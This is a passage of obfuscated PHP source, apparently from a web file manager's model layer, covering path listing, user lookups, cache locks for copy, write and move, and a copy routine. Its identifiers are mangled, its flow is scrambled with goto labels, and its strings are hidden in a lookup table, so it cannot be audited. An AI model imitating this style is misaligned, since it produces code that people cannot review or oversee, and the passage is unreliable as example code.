$c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[396]] == self::TYPE_GROUP) { continue; } if (isset($C°‚£†âÃå[$e‰Ÿ™´á¹•])) { $bÉŞë®‰è­ .= $C°‚£†âÃå[$e‰Ÿ™´á¹•] . $eëÑ’ğ¾“š[8]; } } goto dİ»™ŒÓ­×; dİ»™ŒÓ­×: if ($fÜØ²ªˆ«¾) { $bÉŞë®‰è­ .= $c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[28]]; } if ($c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[395]]) { $bÉŞë®‰è­ .= $eëÑ’ğ¾“š[8]; } $c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[492]] = str_replace($eëÑ’ğ¾“š[493], $eëÑ’ğ¾“š[8], $bÉŞë®‰è­); goto DëøÆ²ÂÕÑ; DëøÆ²ÂÕÑ: $bÃêš¬×† = trim($c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[492]], $eëÑ’ğ¾“š[8]); if ($c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[487]] == $eëÑ’ğ¾“š[494] && $bÃêš¬×†) { $c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[28]] = $bÃêš¬×†; } $this->_listAppendPathRecycle($c¼ĞÌ¬Õ»Ÿ, $fÜØ²ªˆ«¾, $F…å—áæÂ¹); goto Fïè…–¦ê—; Fïè…–¦ê—: } unset($c¼ĞÌ¬Õ»Ÿ); goto Aš‹”¦„ØŒ; Aš‹”¦„ØŒ: return $BíŠŞ­¬Øî; goto B®ì»Éù¾Ì; FÄùšº“–£: foreach ($BíŠŞ­¬Øî as &$c¼ĞÌ¬Õ»Ÿ) { $C°‚£†âÃå[$c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[394]]] = $c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[28]]; $fÜØ²ªˆ«¾ = $this->parentLevelArray($c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[485]]); foreach ($fÜØ²ªˆ«¾ as $B‹Âªˆ½Ş => $e‰Ÿ™´á¹•) { if ($B‹Âªˆ½Ş != 0 && !isset($C°‚£†âÃå[$e‰Ÿ™´á¹•])) { $dˆ¹ã˜†ÂÈ[] = $e‰Ÿ™´á¹•; } } } unset($c¼ĞÌ¬Õ»Ÿ); if (count($dˆ¹ã˜†ÂÈ) > 0) { $e„—´Äí = array($eëÑ’ğ¾“š[408] => array($eëÑ’ğ¾“š[409], $dˆ¹ã˜†ÂÈ)); if (count($dˆ¹ã˜†ÂÈ) == 1) { $cÁ™á±™İ = $this->sourceInfo($dˆ¹ã˜†ÂÈ[0]); $DŠœäÉ°­Í = is_array($cÁ™á±™İ) ? array($cÁ™á±™İ) : !1; } else { $DŠœäÉ°­Í = $this->field($eëÑ’ğ¾“š[491])->where($e„—´Äí)->select(); } $DÙµ‹Ê®¹‹ = array_to_keyvalue($DŠœäÉ°­Í, $eëÑ’ğ¾“š[394], $eëÑ’ğ¾“š[28]); $C°‚£†âÃå = array_merge_index($C°‚£†âÃå, $DÙµ‹Ê®¹‹); } goto b¼·ƒšÓ¼Á; ešÇ®¸ ½º: $eëÑ’ğ¾“š =& $_SERVER[åÌÛ»ô¢‚ö™]; static $C°‚£†âÃå = array(); $dˆ¹ã˜†ÂÈ = array(); goto FÄùšº“–£; B®ì»Éù¾Ì: } private function _listAppendPathRecycle(&$a…áÕ¾îøÉ, $fÇğ¯˜Ş«ğ, $fª»ÔÃğÏ¸) { goto aôšÂàÑà; aôšÂàÑà: $B§ÁÅ×¸¬´ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (intval($a…áÕ¾îøÉ[$B§ÁÅ×¸¬´[396]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($fª»ÔÃğÏ¸, $fÇğ¯˜Ş«ğ) && $a…áÕ¾îøÉ[$B§ÁÅ×¸¬´[394]] != $fª»ÔÃğÏ¸) { return; } goto EíÏ½±‚; EíÏ½±‚: $DÚÌîëĞ…æ = explode($B§ÁÅ×¸¬´[8], trim($a…áÕ¾îøÉ[$B§ÁÅ×¸¬´[492]], $B§ÁÅ×¸¬´[8])); $Dˆõ´‘çôë = implode($B§ÁÅ×¸¬´[8], array_slice($DÚÌîëĞ…æ, 2)); $a…áÕ¾îøÉ[$B§ÁÅ×¸¬´[492]] = $B§ÁÅ×¸¬´[8] . LNG($B§ÁÅ×¸¬´[495]) . $B§ÁÅ×¸¬´[8] . ltrim($Dˆõ´‘çôë, $B§ÁÅ×¸¬´[8]); goto E¹£ÂÔ¡·Ô; E¹£ÂÔ¡·Ô: $a…áÕ¾îøÉ[$B§ÁÅ×¸¬´[485]] = $B§ÁÅ×¸¬´[496] . implode($B§ÁÅ×¸¬´[47], array_slice($fÇğ¯˜Ş«ğ, 1)) . $B§ÁÅ×¸¬´[47]; if ($a…áÕ¾îøÉ[$B§ÁÅ×¸¬´[394]] == $fª»ÔÃğÏ¸) { $a…áÕ¾îøÉ[$B§ÁÅ×¸¬´[485]] = $B§ÁÅ×¸¬´[496]; $a…áÕ¾îøÉ[$B§ÁÅ×¸¬´[487]] = $B§ÁÅ×¸¬´[494]; $a…áÕ¾îøÉ[$B§ÁÅ×¸¬´[28]] = LNG($B§ÁÅ×¸¬´[495]); } $a…áÕ¾îøÉ[$B§ÁÅ×¸¬´[497]] = $B§ÁÅ×¸¬´[498]; goto A¥ÎğÜÇœ; A¥ÎğÜÇœ: } protected function _listAppendPathRoot(&$F ±¿Å§¶, $d’Ä¨ÊäÃ²) { $Bî‹ğ¥ìÆÅ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F‘Üˆóä = $Bî‹ğ¥ìÆÅ[33]; if ($F ±¿Å§¶[$Bî‹ğ¥ìÆÅ[396]] == self::TYPE_USER) { if (defined($Bî‹ğ¥ìÆÅ[451]) && $F ±¿Å§¶[$Bî‹ğ¥ìÆÅ[482]] == USER_ID) { $F‘Üˆóä = LNG($Bî‹ğ¥ìÆÅ[499]); if (!$d’Ä¨ÊäÃ²) { $F ±¿Å§¶[$Bî‹ğ¥ìÆÅ[28]] = $F‘Üˆóä; } } else { $CÒÀØ›É°Š = Model($Bî‹ğ¥ìÆÅ[500])->getInfoSimple($F ±¿Å§¶[$Bî‹ğ¥ìÆÅ[482]]); $F‘Üˆóä = LNG($Bî‹ğ¥ìÆÅ[501]) . $Bî‹ğ¥ìÆÅ[157] . $CÒÀØ›É°Š[$Bî‹ğ¥ìÆÅ[28]] . $Bî‹ğ¥ìÆÅ[502]; } } else { if ($F ±¿Å§¶[$Bî‹ğ¥ìÆÅ[396]] == self::TYPE_GROUP) { $CÒÀØ›É°Š = Model($Bî‹ğ¥ìÆÅ[484])->getInfoSimple($F ±¿Å§¶[$Bî‹ğ¥ìÆÅ[482]]); $F‘Üˆóä = $CÒÀØ›É°Š[$Bî‹ğ¥ìÆÅ[28]]; } else { if ($F ±¿Å§¶[$Bî‹ğ¥ìÆÅ[396]] == self::TYPE_SYSTEM) { $CÒÀØ›É°Š = $this->sourceInfo($d’Ä¨ÊäÃ²[0], !0); $F‘Üˆóä = $CÒÀØ›É°Š[$Bî‹ğ¥ìÆÅ[28]]; } } } $F‘Üˆóä = $F‘Üˆóä ? $Bî‹ğ¥ìÆÅ[8] . $F‘Üˆóä . $Bî‹ğ¥ìÆÅ[8] : $Bî‹ğ¥ìÆÅ[8]; return $F‘Üˆóä; } protected function _listAppendUser(&$BãÌèçÓ¬Ü) { goto aî¨ËÑˆÄ; aî¨ËÑˆÄ: $A÷•„ê•ß… =& $_SERVER[åÌÛ»ô¢‚ö™]; $C§àôµÛÕÑ = array_to_keyvalue($BãÌèçÓ¬Ü, $A÷•„ê•ß…[33], $A÷•„ê•ß…[403]); $A½¤ğô¼ = array_to_keyvalue($BãÌèçÓ¬Ü, $A÷•„ê•ß…[33], $A÷•„ê•ß…[404]); goto Fù³§Ò÷¶Š; Fù³§Ò÷¶Š: $F²ùŒ‹•‘î = array_merge($C§àôµÛÕÑ, $A½¤ğô¼); $eÌ¸îà×Á = Model($A÷•„ê•ß…[503])->userListInfo($F²ùŒ‹•‘î); foreach ($BãÌèçÓ¬Ü as &$a²‰³çœ•Ã) { $fÁ¸‰¼ŠÁÂ = $a²‰³çœ•Ã[$A÷•„ê•ß…[403]]; $a²‰³çœ•Ã[$A÷•„ê•ß…[403]] = $eÌ¸îà×Á[$fÁ¸‰¼ŠÁÂ] ? $eÌ¸îà×Á[$fÁ¸‰¼ŠÁÂ] : !1; $fÁ¸‰¼ŠÁÂ = $a²‰³çœ•Ã[$A÷•„ê•ß…[404]]; $a²‰³çœ•Ã[$A÷•„ê•ß…[404]] = $eÌ¸îà×Á[$fÁ¸‰¼ŠÁÂ] ? $eÌ¸îà×Á[$fÁ¸‰¼ŠÁÂ] : !1; if (isset($a²‰³çœ•Ã[$A÷•„ê•ß…[442]]) && $a²‰³çœ•Ã[$A÷•„ê•ß…[442]][$A÷•„ê•ß…[504]]) { $Bª¸§ÂŸŒ = $GLOBALS[$A÷•„ê•ß…[6]][$A÷•„ê•ß…[84]][$A÷•„ê•ß…[505]]; if ($a²‰³çœ•Ã[$A÷•„ê•ß…[442]][$A÷•„ê•ß…[506]] <= time() - $Bª¸§ÂŸŒ) { $this->metaSet($a²‰³çœ•Ã[$A÷•„ê•ß…[394]], $A÷•„ê•ß…[504], null); $this->metaSet($a²‰³çœ•Ã[$A÷•„ê•ß…[394]], $A÷•„ê•ß…[506], null); unset($a²‰³çœ•Ã[$A÷•„ê•ß…[442]][$A÷•„ê•ß…[504]]); continue; } $a§âšÊÇ¸Ç = $a²‰³çœ•Ã[$A÷•„ê•ß…[442]][$A÷•„ê•ß…[504]]; $a²‰³çœ•Ã[$A÷•„ê•ß…[442]][$A÷•„ê•ß…[507]] = Model($A÷•„ê•ß…[503])->getInfoSimpleOuter($a§âšÊÇ¸Ç); } } goto F‘ÂÄ¿‡ˆª; F‘ÂÄ¿‡ˆª: unset($a²‰³çœ•Ã); goto aª“©¬Ì”; aª“©¬Ì”: } public function parentLevelArray($eê¢ø†Ï‡) { $Aä«¢öŠˆŠ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eê¢ø†Ï‡ = explode($Aä«¢öŠˆŠ[47], trim($eê¢ø†Ï‡, $Aä«¢öŠˆŠ[47])); return array_remove_value($eê¢ø†Ï‡, $Aä«¢öŠˆŠ[494]); } public function listAll($AéØ£×ï¨) { goto EçåäÂŒÖ; eáÌïÏÛ…»: $C´™Ëª¢ôÈ = array_to_keyvalue($C´™Ëª¢ôÈ, $dì´©ò›“ƒ[394]); $A¢™¡ó“Û— = "\x2f{$D÷ˆÜ•Ç¼‚[$dì´©ò›“ƒ[28]]}\x2f"; $A¢™¡ó“Û— = $A¢™¡ó“Û— == $dì´©ò›“ƒ[493] ? $dì´©ò›“ƒ[8] : $A¢™¡ó“Û—; goto D–”Ù™Ãñ; EªÀèÎ£²«: $EÄ¾¦§¯ = $dì´©ò›“ƒ[512]; $Fâ‡èÈ°·¨ = "\114\105\x46\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\x69\x6f\x5f\x66\151\154\145\40\146\151\x6c\145\40\157\156\x20\x73\x6f\x75\162\143\x65\x2e\146\151\154\145\111\104\40\75\40\146\x69\154\145\x2e\146\151\154\145\111\x44"; $C´™Ëª¢ôÈ = $this->alias($dì´©ò›“ƒ[513])->field($EÄ¾¦§¯)->where($dªœŞéàª¾)->join($Fâ‡èÈ°·¨)->select(); goto fÇÚ±ˆóù‡; fÇÚ±ˆóù‡: $this->_listAppendAuth($C´™Ëª¢ôÈ); $this->_listAppendUser($C´™Ëª¢ôÈ); $this->_listAppendPath($C´™Ëª¢ôÈ); goto eáÌïÏÛ…»; EçåäÂŒÖ: $dì´©ò›“ƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D÷ˆÜ•Ç¼‚ = $this->sourceInfo($AéØ£×ï¨); $dªœŞéàª¾ = array($dì´©ò›“ƒ[508] => array($dì´©ò›“ƒ[509], $D÷ˆÜ•Ç¼‚[$dì´©ò›“ƒ[485]] . $AéØ£×ï¨ . $dì´©ò›“ƒ[510]), $dì´©ò›“ƒ[511] => 0); goto EªÀèÎ£²«; D–”Ù™Ãñ: $B™šªÙ¨á‚ = array(); foreach ($C´™Ëª¢ôÈ as $E¥¢Ïß§á => $eºÒÕÑÂ§) { goto bŞœÜª–‘Ş; e¼§Ò’î×ß: $aÛ¸„õ›Ü = str_replace($dì´©ò›“ƒ[493], $dì´©ò›“ƒ[8], $aÛ¸„õ›Ü); $aÛ¸„õ›Ü = str_replace($dì´©ò›“ƒ[493], $dì´©ò›“ƒ[8], $aÛ¸„õ›Ü); $aÑÍ¯ÙøÒí = array($dì´©ò›“ƒ[412] => str_replace($dì´©ò›“ƒ[493], $dì´©ò›“ƒ[8], $aÛ¸„õ›Ü), $dì´©ò›“ƒ[514] => intval($eºÒÕÑÂ§[$dì´©ò›“ƒ[395]]), $dì´©ò›“ƒ[416] => $this->pathInfoFilter($eºÒÕÑÂ§, !0)); goto b´¬ï“ï„¡; bŞœÜª–‘Ş: $e…ä„™ßÓ = $this->parentLevelArray($eºÒÕÑÂ§[$dì´©ò›“ƒ[485]]); array_shift($e…ä„™ßÓ); $aÛ¸„õ›Ü = $A¢™¡ó“Û—; goto AµÑÓ´º‰; b´¬ï“ï„¡: if (!$eºÒÕÑÂ§[$dì´©ò›“ƒ[395]]) { $aÑÍ¯ÙøÒí[$dì´©ò›“ƒ[444]] = $eºÒÕÑÂ§[$dì´©ò›“ƒ[444]]; $aÑÍ¯ÙøÒí[$dì´©ò›“ƒ[515]] = $eºÒÕÑÂ§[$dì´©ò›“ƒ[75]]; } $B™šªÙ¨á‚[] = $aÑÍ¯ÙøÒí; goto bŒÄÑğÅÁ–; AµÑÓ´º‰: for ($aÚè±ëÂáÜ = 0; $aÚè±ëÂáÜ < count($e…ä„™ßÓ); $aÚè±ëÂáÜ++) { $aÛ¸„õ›Ü .= $C´™Ëª¢ôÈ[$e…ä„™ßÓ[$aÚè±ëÂáÜ]][$dì´©ò›“ƒ[28]] . $dì´©ò›“ƒ[8]; } $aÛ¸„õ›Ü .= $eºÒÕÑÂ§[$dì´©ò›“ƒ[28]]; if ($eºÒÕÑÂ§[$dì´©ò›“ƒ[395]]) { $aÛ¸„õ›Ü .= $dì´©ò›“ƒ[8]; } goto e¼§Ò’î×ß; bŒÄÑğÅÁ–: } return $B™šªÙ¨á‚; goto dùÑ¹£é£; dùÑ¹£é£: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($BğÃ…ªä¬Ò) { goto b¥„¯‚Ğà; e¨ƒ¸õ¡‚: $DÃ—ìß¢ = 1; $this->_lockEvent($BğÃ…ªä¬Ò, array($BÕ‘¦ïóºš[517], $BÕ‘¦ïóºš[518]), $DÃ—ìß¢); $this->_lockParent($BğÃ…ªä¬Ò, array($BÕ‘¦ïóºš[518]), $DÃ—ìß¢); goto F—·ã©Æœì; b¥„¯‚Ğà: $BÕ‘¦ïóºš =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->allowLock()) { return; } $this->_lockCheck($BÕ‘¦ïóºš[516], $BğÃ…ªä¬Ò); goto e¨ƒ¸õ¡‚; F—·ã©Æœì: $this->_lockEvent($BğÃ…ªä¬Ò, array($BÕ‘¦ïóºš[519], $BÕ‘¦ïóºš[520]), $DÃ—ìß¢); $this->_lockCheckEnd($BÕ‘¦ïóºš[516], $BğÃ…ªä¬Ò); goto dø–Õ²Ù£; dø–Õ²Ù£: } public function lockCopyEnd($DõÎÀñ¢óˆ) { $e¯‡¢°È± =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->allowLock()) { return; } $AÂÃ­±•¼ = 0; $this->_lockEvent($DõÎÀñ¢óˆ, array($e¯‡¢°È±[517], $e¯‡¢°È±[518]), $AÂÃ­±•¼); $this->_lockParent($DõÎÀñ¢óˆ, array($e¯‡¢°È±[518]), $AÂÃ­±•¼); $this->_lockEvent($DõÎÀñ¢óˆ, array($e¯‡¢°È±[519], $e¯‡¢°È±[520]), $AÂÃ­±•¼); } public function lockWriteStart($böª›â¦ö, $FèÙ÷Œ¦‹Ä = '') { goto EåçÅÍ¹ç; dá«åè ˜º: $this->_lockParent($böª›â¦ö, array($FëŞâÊæÒ¾[516], $FëŞâÊæÒ¾[518]), $Dšçİ÷Á‚¬); $this->_lockCheckEnd($FëŞâÊæÒ¾[517], $böª›â¦ö); goto Fƒ­º°¤®ô; EåçÅÍ¹ç: $FëŞâÊæÒ¾ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->allowLock()) { return; } $this->_lockCheck($FëŞâÊæÒ¾[517], $böª›â¦ö); goto d¢ÓùÚ¤‹; d¢ÓùÚ¤‹: $Dšçİ÷Á‚¬ = 1; $this->_lockKey($FëŞâÊæÒ¾[521] . $böª›â¦ö . $FëŞâÊæÒ¾[91] . $FèÙ÷Œ¦‹Ä, $Dšçİ÷Á‚¬); $this->_lockEvent($böª›â¦ö, array($FëŞâÊæÒ¾[516], $FëŞâÊæÒ¾[518]), $Dšçİ÷Á‚¬); goto dá«åè ˜º; Fƒ­º°¤®ô: } public function lockWriteEnd($C÷×¶‘’Ì“, $aÀİ×àÉô‡ = '') { $c¥¦„…àŠÜ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->allowLock()) { return; } $F„ˆ—§‹Íø = 0; $this->_lockKey($c¥¦„…àŠÜ[521] . $C÷×¶‘’Ì“ . $c¥¦„…àŠÜ[91] . $aÀİ×àÉô‡, $F„ˆ—§‹Íø); $this->_lockEvent($C÷×¶‘’Ì“, array($c¥¦„…àŠÜ[516], $c¥¦„…àŠÜ[518]), $F„ˆ—§‹Íø); $this->_lockParent($C÷×¶‘’Ì“, array($c¥¦„…àŠÜ[516], $c¥¦„…àŠÜ[518]), $F„ˆ—§‹Íø); } public function lockMoveStart($CØ—ÑğØ ¦) { goto fó§íóé¬â; fó§íóé¬â: $b‘¬Œáä¾¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->allowLock()) { return; } $this->_lockCheck($b‘¬Œáä¾¤[518], $CØ—ÑğØ ¦); goto CÚ¾µ’¸ó¹; CÚ¾µ’¸ó¹: $B³†Ôºª¢ = 1; $this->_lockKey($b‘¬Œáä¾¤[522] . $CØ—ÑğØ ¦, $B³†Ôºª¢); $this->_lockEvent($CØ—ÑğØ ¦, array($b‘¬Œáä¾¤[516], $b‘¬Œáä¾¤[517]), $B³†Ôºª¢); goto BøÅÁÄ×¨Ö; BøÅÁÄ×¨Ö: $this->_lockParent($CØ—ÑğØ ¦, array($b‘¬Œáä¾¤[516], $b‘¬Œáä¾¤[518]), $B³†Ôºª¢); $this->_lockEvent($CØ—ÑğØ ¦, array($b‘¬Œáä¾¤[523], $b‘¬Œáä¾¤[519], $b‘¬Œáä¾¤[520]), $B³†Ôºª¢); $this->_lockCheckEnd($b‘¬Œáä¾¤[518], $CØ—ÑğØ ¦); goto eÚ’Áœ–­; eÚ’Áœ–­: } public function lockMoveEnd($DÓ‹ÏÏ½Œ) { goto C¦Ú§¶«‚‰; C¦Ú§¶«‚‰: $eŒêŠï¥„ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->allowLock()) { return; } $cêõ…óŞ†º = 0; goto Cƒ‘ğšà; Cƒ‘ğšà: $this->_lockKey($eŒêŠï¥„[522] . $DÓ‹ÏÏ½Œ, $cêõ…óŞ†º); $this->_lockEvent($DÓ‹ÏÏ½Œ, array($eŒêŠï¥„[516], $eŒêŠï¥„[517]), $cêõ…óŞ†º); $this->_lockParent($DÓ‹ÏÏ½Œ, array($eŒêŠï¥„[516], $eŒêŠï¥„[518]), $cêõ…óŞ†º); goto eßçÁÀÑ£¥; eßçÁÀÑ£¥: $this->_lockEvent($DÓ‹ÏÏ½Œ, array($eŒêŠï¥„[523], $eŒêŠï¥„[519], $eŒêŠï¥„[520]), $cêõ…óŞ†º); goto cªÌÚ¦¬êß; cªÌÚ¦¬êß: } private function _lockCheck($bØÓÚìÆ², $c‡ï§æ†‰é) { goto DèÄÛ°ÛìÚ; DèÄÛ°ÛìÚ: $D—‰¿’‡Â‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dïĞÙºÔâ = $this->sourceInfo($c‡ï§æ†‰é); $BøˆÏ†¢ï¼ = $bØÓÚìÆ² . $D—‰¿’‡Â‰[91] . $c‡ï§æ†‰é; goto C‡„ˆîÍ¾„; bÅÌó‘İÙ±: $d¾”ÃõÂ× = array_reverse($this->parentLevelArray($dïĞÙºÔâ[$D—‰¿’‡Â‰[485]])); foreach ($d¾”ÃõÂ× as $D˜‘·˜Ï–Š) { $BøˆÏ†¢ï¼ = $bØÓÚìÆ² . $D—‰¿’‡Â‰[525] . $D˜‘·˜Ï–Š; if (CacheLock::lockGet($D—‰¿’‡Â‰[526] . $BøˆÏ†¢ï¼)) { $dïĞÙºÔâ = $this->sourceInfo($D˜‘·˜Ï–Š); CacheLock::setErrorMsg($D—‰¿’‡Â‰[157] . htmlspecialchars($dïĞÙºÔâ[$D—‰¿’‡Â‰[28]]) . $D—‰¿’‡Â‰[502] . $D‰¼ã¯ø²Ö); $this->_lockKey($BøˆÏ†¢ï¼, 1); $this->_lockKey($BøˆÏ†¢ï¼, 0); } } goto b×”Ä—„Å; EÌĞ–½›ôĞ: CacheLock::setErrorMsg($D—‰¿’‡Â‰[157] . htmlspecialchars($dïĞÙºÔâ[$D—‰¿’‡Â‰[28]]) . $D—‰¿’‡Â‰[502] . $D‰¼ã¯ø²Ö); $this->_lockKey($BøˆÏ†¢ï¼, 1); $this->_lockKey($BøˆÏ†¢ï¼, 0); goto bÅÌó‘İÙ±; C‡„ˆîÍ¾„: $this->_lockTimeStart[$BøˆÏ†¢ï¼] = timeFloat(); if (!is_array($dïĞÙºÔâ)) { return; } $D‰¼ã¯ø²Ö = LNG($D—‰¿’‡Â‰[524]); goto EÌĞ–½›ôĞ; b×”Ä—„Å: } private function _lockCheckEnd($DêˆŞéİ‰, $Aëùë£˜÷‹) { goto B÷óîğî–; B÷óîğî–: $B¸²²ÜËù =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fî‹éÖãµ = $DêˆŞéİ‰ . $B¸²²ÜËù[91] . $Aëùë£˜÷‹; CacheLock::setErrorMsg($B¸²²ÜËù[377]); goto E¦ßŠ½è•; E¦ßŠ½è•: if (!isset($this->_lockTimeStart[$Fî‹éÖãµ])) { return; } $FÕàõœ¹“ = timeFloat() - $this->_lockTimeStart[$Fî‹éÖãµ]; unset($this->_lockTimeStart[$Fî‹éÖãµ]); goto bï¬»³‘òÆ; bï¬»³‘òÆ: if ($FÕàõœ¹“ > 0.5) { unset(self::$cacheSourceInfo[$B¸²²ÜËù[435] . $Aëùë£˜÷‹]); } $Cå»Ã²‹ƒá = $this->sourceInfo($Aëùë£˜÷‹); if (!$Cå»Ã²‹ƒá) { show_json(LNG($B¸²²ÜËù[101]), !1); } goto a¹È‡®âïĞ; a¹È‡®âïĞ: } private function _lockParent($EÇÈ±ºğ‘ñ, $b¼ĞãÓ½Á‡, $B¾­‹©ŒÈ) { if (!$this->autoLockSet) { return; } $aÃ¿Íê‰ù = $this->sourceInfo($EÇÈ±ºğ‘ñ); if (!is_array($aÃ¿Íê‰ù)) { return; } $C©ìµö­Š = array_reverse($this->parentLevelArray($aÃ¿Íê‰ù[$_SERVER[åÌÛ»ô¢‚ö™][485]])); foreach ($C©ìµö­Š as $eÕ®²ñ½À) { $this->_lockEvent($eÕ®²ñ½À, $b¼ĞãÓ½Á‡, $B¾­‹©ŒÈ); } } private function _lockEvent($aäËÜÔÂÌ, $FõÄˆ¥¸’¨, $eÁà¦±Ç½) { $e¡—¿İ¼ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->autoLockSet) { return; } foreach ($FõÄˆ¥¸’¨ as $CŠÖä¤Å¼) { $c ïñŠõ² = $CŠÖä¤Å¼ . $e¡—¿İ¼[91] . $aäËÜÔÂÌ; if ($eÁà¦±Ç½ && CacheLock::lockGet($e¡—¿İ¼[526] . $c ïñŠõ²)) { continue; } $this->_lockKey($c ïñŠõ², $eÁà¦±Ç½); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($D×êÖÄÓóø, $C©è„É½æ¼ = 1) { $a£­Ï×«ªÆ = $_SERVER[åÌÛ»ô¢‚ö™][526] . md5($D×êÖÄÓóø); if ($C©è„É½æ¼) { if (isset(self::$_lockItemArr[$a£­Ï×«ªÆ])) { return; } self::$_lockItemArr[$a£­Ï×«ªÆ] = 1; CacheLock::lock($a£­Ï×«ªÆ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$a£­Ï×«ªÆ])) { return; } unset(self::$_lockItemArr[$a£­Ï×«ªÆ]); CacheLock::unlock($a£­Ï×«ªÆ); } } public function isParentOf($F•ù“®”ø, $Aöù‘‚Ä†Ğ) { goto F›é‘ÏòŠë; b§ÈìªÒÕ: return $E¥è™íÃâ²; goto FÕ¶ºåÜ; C†Ş­æö¤¬: $d¤öÏ³›É = $C¢î¹ôš…[$fåèÂÊ¸ŸÙ[485]] . $C¢î¹ôš…[$fåèÂÊ¸ŸÙ[394]] . $fåèÂÊ¸ŸÙ[47]; $eÑèßÓ¤± = $a¹˜¢§«¢[$fåèÂÊ¸ŸÙ[485]] . $a¹˜¢§«¢[$fåèÂÊ¸ŸÙ[394]] . $fåèÂÊ¸ŸÙ[47]; $E¥è™íÃâ² = strpos($eÑèßÓ¤±, $d¤öÏ³›É) === 0; goto b§ÈìªÒÕ; F›é‘ÏòŠë: $fåèÂÊ¸ŸÙ =& $_SERVER[åÌÛ»ô¢‚ö™]; $C¢î¹ôš… = $this->sourceInfo($F•ù“®”ø); $a¹˜¢§«¢ = $this->sourceInfo($Aöù‘‚Ä†Ğ); goto C†Ş­æö¤¬; FÕ¶ºåÜ: } private $targetIsDelete = 0; public function copy($F±ê¬÷¶´¢, $E¿†‹ÓÚ‰, $eÔùÑÉ ²´ = REPEAT_REPLACE, $aíÅ…‰¾Æö = '') { goto d‰À•›¸; b£ù¼²ğ†è: $this->targetIsDelete = intval($EÊŞ‚„ÑÂ[$cêé„”Î[422]]); $fßÏ‘¿¢ìÅ = $this->fileNameExistCache($E¿†‹ÓÚ‰, $EÊŞ‚„ÑÂ[$cêé„”Î[28]]); $cäÂ‡¤Ë·Â = $this->_copy($F±ê¬÷¶´¢, $E¿†‹ÓÚ‰, $eÔùÑÉ ²´, $f–ñÉ††×™, !0, $aíÅ…‰¾Æö); goto e“ÖÚ¡«œï; e–”‰¶õš‡: $this->lockCopyStart($F±ê¬÷¶´¢); $this->lockWriteStart($E¿†‹ÓÚ‰, $E©³Å‚‘Ã); $f–ñÉ††×™ = array($cêé„”Î[527] => array(), $cêé„”Î[528] => array(), $cêé„”Î[529] => array()); goto b£ù¼²ğ†è; d‰À•›¸: $cêé„”Î =& $_SERVER[åÌÛ»ô¢‚ö™]; $EÊŞ‚„ÑÂ = $this->sourceInfo($F±ê¬÷¶´¢); $e·ø‡¹†‰¦ = $this->sourceInfo($E¿†‹ÓÚ‰); goto BöÎòêÒ“õ; b²¤öáŒ©İ: $this->saveAll($f–ñÉ††×™[$cêé„”Î[529]]); Model($cêé„”Î[171])->linkAdd($f–ñÉ††×™[$cêé„”Î[527]]); $this->folderSizeReset($E¿†‹ÓÚ‰); goto aÓ‡•òíÚ; BöÎòêÒ“õ: if (!$EÊŞ‚„ÑÂ || !$e·ø‡¹†‰¦ || $e·ø‡¹†‰¦[$cêé„”Î[395]] != $cêé„”Î[83]) { return !1; } if ($this->isParentOf($F±ê¬÷¶´¢, $E¿†‹ÓÚ‰)) { return !1; } $E©³Å‚‘Ã = $aíÅ…‰¾Æö ? $aíÅ…‰¾Æö : $EÊŞ‚„ÑÂ[$cêé„”Î[28]]; goto e–”‰¶õš‡; B…öâ‰Üá: if ($EÊŞ‚„ÑÂ[$cêé„”Î[395]] == $cêé„”Î[83] && $fßÏ‘¿¢ìÅ == $cäÂ‡¤Ë·Â) { $this->folderSizeResetChildren($fßÏ‘¿¢ìÅ); } Model($cêé„”Î[530])->addAll($f–ñÉ††×™[$cêé„”Î[528]], array(), !0); if ($fßÏ‘¿¢ìÅ != $cäÂ‡¤Ë·Â || $EÊŞ‚„ÑÂ[$cêé„”Î[395]] == $cêé„”Î[83]) { Model($cêé„”Î[531])->eventCopy($cäÂ‡¤Ë·Â); } goto b²¤öáŒ©İ; aÓ‡•òíÚ: $this->updateModifyTime($E¿†‹ÓÚ‰); return $cäÂ‡¤Ë·Â; goto Bœ‹ØÑñ×¤; e“ÖÚ¡«œï: $this->_childrenListClear(); $this->lockCopyEnd($F±ê¬÷¶´¢); $this->lockWriteEnd($E¿†‹ÓÚ‰, $E©³Å‚‘Ã); goto B…öâ‰Üá; Bœ‹ØÑñ×¤: } private function _copy($Bö…ÛŞ»ğ—, $d‡õˆêË¾Æ, $a †ÃÚè£, &$dØ™”Òø‰, $b¶æó¸éÔ£, $cÙ±ˆÊ÷Ô£ = '') { goto dë­Ö¦İãÕ; b”Œï¨—Ñº: return $A¶õîÕÈïÌ; goto E´… Ñ¨…; dë­Ö¦İãÕ: $d²Íä¹³µ« =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fèˆ¤¤„‚… = $this->sourceInfoCache($Bö…ÛŞ»ğ—); $AœŠ¼ÂÈçÂ = $Fèˆ¤¤„‚…[$d²Íä¹³µ«[395]] == 